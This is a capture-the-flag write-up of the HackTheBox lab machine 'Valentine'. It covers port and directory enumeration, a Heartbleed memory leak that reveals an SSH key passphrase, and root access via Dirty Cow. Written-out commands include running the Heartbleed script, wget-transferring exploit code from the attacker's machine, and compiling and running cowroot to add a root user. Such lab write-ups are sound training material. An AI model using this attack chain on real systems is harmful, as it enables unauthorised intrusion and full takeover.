[Home](https://m0chan.github.io) [HackTheBox](https://m0chan.github.io)
# Valentine on HackTheBox
------
## 10th August 2018
------
![Image of Valentine](https://i.imgur.com/8HVRNyG.jpg)
### Introduction

Valentine was a extremely fun box for me which I would say is aimed at Beginner - Intermediate's. If you are aware of industry recognised exploits & particularly exploits that are famous within the InfoSec community you will probably blitz straight through it in half an hour. Nevertheless it was a great box. 

Ps: If you do not know what HackTheBox is it is a Free/Paid resource found [Here](http://hackthebox.eu) which offers you a lab network littered with intentionally vulnerable boxes (Desktops, Servers, Web Applications, Domain Controllers etc) It really has so much to offer. 

Lets begin. 

## Enumeration - Initial

To kick off my enumeration I started it off as I usually do with a simple ```nMap``` Top 100 Ports Scan using the following syntax

``` nMap -A -verbose 4 10.10.10.79 ```
- The ``` -A ``` flag tells nMap to use aggresive scanning which bundles Service Detection & OS Detection into one. (Not necessary but I like to use it)
- The ``` -verbose 4 ``` sets the verbosity of the scan to 4 which provides me more information than a normal scan in real-time. (Highly useful if scanning all ports & need updates in real-time and not once the scan has finished) 

I also ran ``` nMap -A -p- -verbose 4 10.10.10.79 ``` which scanned all ```65,535``` TCP Ports however I will not show the output of this as the Top 100 ports output is all we need.

```
nmap -A 10.10.10.79

Starting Nmap 7.60 ( https://nmap.org ) at 2018-08-13 18:56 BST
Nmap scan report for 10.10.10.79
Host is up (0.041s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2018-08-13T17:52:21+00:00; -4m25s from scanner time.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=8/13%OT=22%CT=1%CU=35676%PV=Y%DS=2%DC=T%G=Y%TM=5B71C66
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=8)OPS(
OS:O1=M54DST11NW4%O2=M54DST11NW4%O3=M54DNNT11NW4%O4=M54DST11NW4%O5=M54DST11
OS:NW4%O6=M54DST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890)ECN(
OS:R=Y%DF=Y%T=40%W=3908%O=M54DNNSNW4%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=3890%S=O%A=S+%F=AS%O=M54DST11NW4%RD=0
OS:%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z
OS:%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RI
OS:PL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -4m25s, deviation: 0s, median: -4m25s

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   39.48 ms 10.10.14.1
2   39.87 ms 10.10.10.79

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.82 seconds
```

From the above nMap Scan we gather 3 ports of interest ```22 (SSH)```, ```80 (http)``` & ```443 (SSL/HTTPS)``` - Anytime I see Port 80 open on a box I immediately visit the box inside a web browser to see what is being hosted on the web server. 

In this case upon visiting ```http://10.10.10.79:80``` I was greeted a page with an image (The one above) I tried doing some Steganography on the image but it wasn't hiding anything - Boring! Time to enumerate this web server further...

### Enumeration - Dirb

As I have recently discovered that the server is running apache, It was fairly obvious to me that there may be a vulnerable web application somewhere that I had to find. I decided to use the handy tool ```dirb``` which can be parsed a wordlist containing known directory names and scan the web server... 

I kicked ```dirb``` off with the following syntax ``` dirb http://10.10.10.79``` This will automatically use the common.txt wordlist that comes with ```dirb```. I like to start with common.txt and if it finds nothing I can create custom wordlists depending on the nature of the box.

Luckily for me this time ```common.txt``` was more than enough and successfully  informed of directories on the server which could take me further. 

``` DIRB v2.22    
By The Dark Raver
START_TIME: Mon Jul 23 09:04:48 2018
URL_BASE: http://10.10.10.79/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
GENERATED WORDS: 4612                                                          

Scanning URL: http://10.10.10.79/ 
 http://10.10.10.79/cgi-bin/ (CODE:403|SIZE:287)                                                      
 http://10.10.10.79/decode (CODE:200|SIZE:552)                                                        
 DIRECTORY: http://10.10.10.79/dev/                                                                 
 http://10.10.10.79/encode (CODE:200|SIZE:554)                                                        
 http://10.10.10.79/index (CODE:200|SIZE:38)                                                          
 http://10.10.10.79/index.php (CODE:200|SIZE:38)
```

Very interesting, now I do not want to blabber on for ages about what was happening on each page but here's a breakdown of each page & directory.

* ``decode`` PHP Utility that decoded any Base64 String 
* ``encode`` PHP Utility that encoded any Base64 String 
* ``dev(directory)`` This was where I found something interesting... Inside the dev directory there was 2 things.
* 1. Notes.txt
* 2. hype_key
![Image Of Notes.txt](https://i.imgur.com/ES2ZBRs.png)
As you can see in the notes.txt screenshot it appears as if the decode/encode application running on the web server handles everything __server-side...__ as well as notes.txt we also discovered `hype_key`. Upon opening hype_key we are presented with a `hex` string. I used the following [website](http://www.convertstring.com/EncodeDecode/HexDecode) to convert `hex` to `text`. 

Upon successfully converting the `hex` string I was greeted with an SSH Private Key - Woo! Maybe I could use this to SSH into Valentine?

### Enumeration - SSL

Now I have gathered the above information regarding Port `80` I decided to carry out some further enumeration on Port `443`, Upon visiting `http://10.10.10.79:443` my connection was dropped which in turn left me thinking it was a dead-end before my buddy gave me a little hint to enumerate it further ;) 

I decided to utilise a tool that comes with `kali` called `sslscan` - It is a great lightweight tool that is always worth running against a box with `HTTPS` open. 

```
root@kali:~/Desktop/Scripts/Valentine# sslscan 10.10.10.79
Version: 1.11.10-static
OpenSSL 1.0.2-chacha (1.0.2g-dev)

Testing SSL server 10.10.10.79 on port 443 using SNI name 10.10.10.79

  TLS Fallback SCSV:
Server does not support TLS Fallback SCSV

  TLS renegotiation:
Secure session renegotiation supported

  TLS Compression:
Compression disabled

  Heartbleed:
TLS 1.2 vulnerable to heartbleed
TLS 1.1 vulnerable to heartbleed
TLS 1.0 vulnerable to heartbleed
```

Pay attention to the last 3 lines __vulnerable to heartbleed__ - Great! Perhaps we can exploit the famous heartbleed vulnerability to read the memory on the server. 


## Exploiting - Piecing the Pieces Together!

Before we begin exploiting lets first talk about the `heartbleed` vulnerability we just discoverved the server is vulnerable too. The heartbleed bug was a critical vulnerability in the OpenSSL library which can allow an attacker to read data from the server-memory which should be protected. 

Perhaps we can use heartbleed to read the server memory and intercept any encoding/decoding happening __server-side__.

I decided to use [this](https://gist.github.com/eelsivart/10174134) python script to exploit heartbleed rather than metasploit as I try my best to do everything manually or at least to not use metasploit.

I ran `heartbleed.py` with the following syntax `python heartbleed.py 10.10.10.79` - which returned the below output. *(One thing worth noting I actually had to run this script 10-15 times before getting the output I was after)*

```
root@kali:~/Desktop/Scripts/Valentine# python heartbleed.py 10.10.10.79

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: 10.10.10.79:443, 1 times
Sending Client Hello for TLSv1.0
Received Server Hello for TLSv1.0

WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 1 of 1
##################################################################

.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.j..!.)p.8.&...AL
```

Woohoo! As you can see I intercepted a string being encoded server side and was able to capture the following Base64 string `aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==` - After a quick decode I was left with the following `heartbleedbelievethehype`

### Exploiting - Logging in / First Shell

Now I had the `heartbleedbelievethehype` password I quickly noticed a common recurrence of the word `hype` - I had a stab in the dark by trying to SSH into Valentine with the below syntax

`ssh -i hype_keydecoded.txt hype@10.10.10.79`
Upon running this command I was prompted for a passphrase for the account... Easy `heartbleedbelievethehype`

Perfect! I was now logged into Valentine as the user hype and able to capture the User Flag! 

Time to try escalate privileges and take over the whole machine. 

## Privilege Escalation - Further Enumeration!

As always one of the first things I do after logging into a linux machine as a limited user besides having a general snoop around is run `linuxprivchecker.py`.

LinuxPrivChecker.py is a great python script that enumerates the system overall and provides us a vast array of information that may help us to escalate privileges. 

I transferred LinuxPrivChecker to `/tmp` on Valentine using `python -m SimpleHTTPServer` & `wget`. 

From here it was as simple as running `Chmod 777` against `linuxprivchecker.py` and running it with `python linuxprivchecker.py > results.txt` - This saved the results of LinuxPrivChecker to a results.txt for later consultation. (*I am not going to share the full results of LinuxPrivChecker here as it is very long*.)

Here is a small snippet of my results.txt
```
=================================================================================================
LINUX PRIVILEGE ESCALATION CHECKER
=================================================================================================

[*] GETTING BASIC SYSTEM INFO...

[+] Kernel
    Linux version 3.2.0-23-generic (buildd@crested) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu4) ) #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012

[+] Hostname
    Valentine

[+] Operating System
    Ubuntu 12.04 LTS \n \l

[*] GETTING NETWORKING INFO...

[+] Interfaces
    eth0      Link encap:Ethernet  HWaddr 00:50:56:bf:ab:ef
    inet addr:10.10.10.79  Bcast:10.10.10.255  Mask:255.255.255.0
    inet6 addr: dead:beef::250:56ff:febf:abef/64 Scope:Global
    inet6 addr: fe80::250:56ff:febf:abef/64 Scope:Link
    inet6 addr: dead:beef::351e:ef73:6022:a1ee/64 Scope:Global
    UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
    RX packets:18533 errors:0 dropped:0 overruns:0 frame:0
    TX packets:1066 errors:0 dropped:0 overruns:0 carrier:0
    collisions:0 txqueuelen:1000
    RX bytes:1566181 (1.5 MB)  TX bytes:304284 (304.2 KB)
    lo        Link encap:Local Loopback
    inet addr:127.0.0.1  Mask:255.0.0.0
    inet6 addr: ::1/128 Scope:Host
    UP LOOPBACK RUNNING  MTU:16436  Metric:1
    RX packets:4450 errors:0 dropped:0 overruns:0 frame:0
    TX packets:4450 errors:0 dropped:0 overruns:0 carrier:0
    collisions:0 txqueuelen:0
    RX bytes:1135452 (1.1 MB)  TX bytes:1135452 (1.1 MB)

[+] Netstat
    Active Internet connections (servers and established)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
    tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
    tcp        0     40 10.10.10.79:22          10.10.14.9:41198        ESTABLISHED -
    tcp6       0      0 :::80                   :::*                    LISTEN      -
    tcp6       0      0 :::22                   :::*                    LISTEN      -
    tcp6       0      0 ::1:631                 :::*                    LISTEN      -
    tcp6       0      0 :::443                  :::*                    LISTEN      -
    udp        0      0 0.0.0.0:60360           0.0.0.0:*                           -
    udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -
    udp6       0      0 :::5353                 :::*                                -
    udp6       0      0 :::57582                :::*                                -

[+] Route
    Kernel IP routing table
    Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
    default         10.10.10.2      0.0.0.0         UG    100    0        0 eth0
    10.10.10.0      *               255.255.255.0   U     0      0        0 eth0
    link-local      *               255.255.0.0     U     1000   0        0 eth0
```

### Privilege Escalation - Dirty Cow

After I ran LinuxPrivChecker something immediately jumped out at me : 
* `Linux version 3.2.0-23-generic (buildd@crested) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu4) ) #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012`

This kernel certainly looks vulnerable to the famous Dirty Cow that effected most Linux Systems when it was first released. 

Before I talk about exploiting Dirty Cow in Practice let's first talk about what it is. Dirty Cow is a vulnerability within certain linux kernels *(2.6.22 <3.9)* which could allow an attack to escalate to __root__ privileges. Let's exploit it. 

To exploit DirtyCow I used Exploit [40616](https://www.exploit-db.com/exploits/40616/), here's how!
* 1. Transfer cowroot.c using `wget` to Valentine 
* 2. Compile cowroot.c with the following command `gcc cowroot.c -o cowroot -pthread`
* 3. Run the compiled binary `./cowroot`

This will now proceed to add a new user entitled `Firefart` into `/etc/passwd` with __root__ privileges

Finally switch user with `su firefart` and you should be logged in as __root!__ - You now completely own this box.

------
### Conclusion

Overall Valentine was a great back and allowed me to learn a couple of neat tricks and be able to exploit heartbleed in practice - Stay tuned for my next writeup as I have a few coming once they are finally retired! 

m0chan / Aidan
